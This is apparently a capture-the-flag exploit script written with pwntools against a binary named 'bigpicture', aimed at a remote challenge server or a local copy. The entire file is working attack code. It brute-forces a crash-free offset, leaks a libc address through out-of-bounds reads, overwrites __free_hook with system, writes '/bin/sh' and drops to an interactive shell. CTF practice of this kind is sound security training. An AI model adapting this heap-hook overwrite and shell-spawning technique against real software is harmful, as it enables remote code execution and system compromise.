#!/usr/bin/python
from pwn import *
import sys


def set_size(width, height):
    print p.recvuntil("How big? ")
    p.sendline(str(width)+"x"+str(height))


def leak(offset):
    addr=""
    for i in range(0,6):
        p.sendline("0, "+str(offset)+", a")
        data = p.recvuntil("!")
        print data
        addr += data[-2:-1]
        offset+=1
        print p.recvuntil("> ")

    leak_addr=u64(addr+"\x00\x00")
    print hex(leak_addr)
    return leak_addr

def write(addr1, addr2, n):
    for i in range(0,n):
        print i, 'write', addr2[i]
        p.sendline("0, "+str(addr1)+", "+addr2[i])
        addr1+=1
        print p.recvuntil("> ")

if __name__ == "__main__":
    while True:
        try:
            if len(sys.argv)>=2:
                p = remote("bigpicture.chal.pwning.xxx",420)
                offset = -0xe4000 - 0x2a000
            else:
                p = process("./bigpicture", env={"LD_PRELOAD":"./libc-2.23.so"})
                offset = -0xea000 - 0x2a000
            set_size(1056,1056)

            print p.recvuntil("> ")
            print 'offset', hex(offset)
            p.sendline("0, "+str(offset)+", a")
            data = p.recv()
            print data
            if 'Segmentation' in data:
                offset -= 0x1000
                p.close()
                continue
            break
        except:
            print 'repeat'
            offset -= 0x1000

            p.close()
    print 'FIND', hex(offset)
    addr = leak(offset)

    libc = addr - 0x3c3ff8
    free_hook_offset = offset + 6040
    one_gadget = libc + 0xf0567 #rsp+0x70
    #call_rdi = libc + 0x7d8b0
    system_addr = libc + 283536

    print 'libc', hex(libc)
    print 'free_hook_offset', hex(free_hook_offset)
    print 'one_gadget', hex(one_gadget)
    #print 'call rid', hex(call_rdi)
    print 'system addr', hex(system_addr)

    #write(free_hook_offset, p64(call_rdi))
    #write(0, p64(one_gadget))
    write(free_hook_offset, p64(system_addr), 6)
    write(0, "/bin/sh", len("/bin/sh"))
    p.interactive()

